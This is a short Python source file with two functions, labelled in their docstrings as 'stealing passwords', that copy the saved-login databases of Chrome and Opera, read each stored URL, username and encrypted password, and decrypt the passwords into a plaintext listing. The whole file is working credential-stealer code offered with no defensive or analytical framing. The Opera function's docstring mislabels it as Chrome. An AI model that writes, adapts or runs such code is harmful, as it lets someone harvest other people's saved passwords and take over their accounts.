# -*- coding: utf-8 -*-
import os
import sqlite3
import win32crypt
import shutil


def chrome():
    """stealing passwords from Chrome"""

    output = "    CHROME LOGIN DATA    "
    try:
        if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data'):
            shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data',
                         os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')

        conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')

        for result in cursor.fetchall():
            password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
            if password:
                output = output + "\n" + "url: " + result[0] + "  |  login: " + result[1] + "  |  password: " + password.decode("utf-8") 
    except:
        return "chrome didn't installed"
    return (output)


def opera():
    """stealing passwords from Chrome"""

    output = "    OPERA LOGIN DATA    "
    try:
        if os.path.exists(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data'):
            shutil.copy2(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data',
                         os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data2')
        conn = sqlite3.connect(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data2')
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for result in cursor.fetchall():
            password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
            if password:
                output = output + "\n" + "url: " + result[0] + "  |  login: " + result[1] + "  |  password: " + password.decode("utf-8") 
    except:
        return "opera didn't installed"
    return (output)
